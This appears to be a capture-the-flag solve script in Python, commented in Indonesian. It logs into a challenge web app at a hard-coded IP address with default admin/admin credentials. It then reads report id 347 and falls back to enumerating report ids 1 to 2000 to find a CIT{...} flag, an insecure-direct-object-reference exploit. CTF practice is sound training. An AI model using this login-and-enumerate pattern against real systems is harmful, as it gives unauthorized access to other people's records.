#!/usr/bin/env python3
import re
import sys
import requests

BASE_URL = "http://23.179.17.92:5001"
USERNAME = "admin"
PASSWORD = "admin"
FLAG_RE = re.compile(r"CIT\{[^}]+\}")


def get_flag_from_id(session: requests.Session, report_id: int) -> str | None:
    try:
        r = session.get(f"{BASE_URL}/report", params={"id": report_id}, timeout=4)
    except requests.RequestException:
        return None

    if r.status_code != 200:
        return None

    m = FLAG_RE.search(r.text)
    return m.group(0) if m else None


def main() -> int:
    s = requests.Session()
    login = s.post(
        f"{BASE_URL}/login",
        data={"username": USERNAME, "password": PASSWORD},
        allow_redirects=False,
        timeout=5,
    )

    if login.status_code != 302:
        print(f"[-] Login gagal. Status: {login.status_code}")
        return 1

    # Berdasarkan hasil exploit, flag ada di report id 347.
    flag = get_flag_from_id(s, 347)
    if flag:
        print("[+] Flag ditemukan di report id=347")
        print(f"<FLAG>{flag}</FLAG>")
        return 0

    # Fallback: enumerasi cepat jika ID berubah.
    for report_id in range(1, 2001):
        flag = get_flag_from_id(s, report_id)
        if flag:
            print(f"[+] Flag ditemukan di report id={report_id}")
            print(f"<FLAG>{flag}</FLAG>")
            return 0

    print("[-] Flag tidak ditemukan")
    return 1


if __name__ == "__main__":
    sys.exit(main())
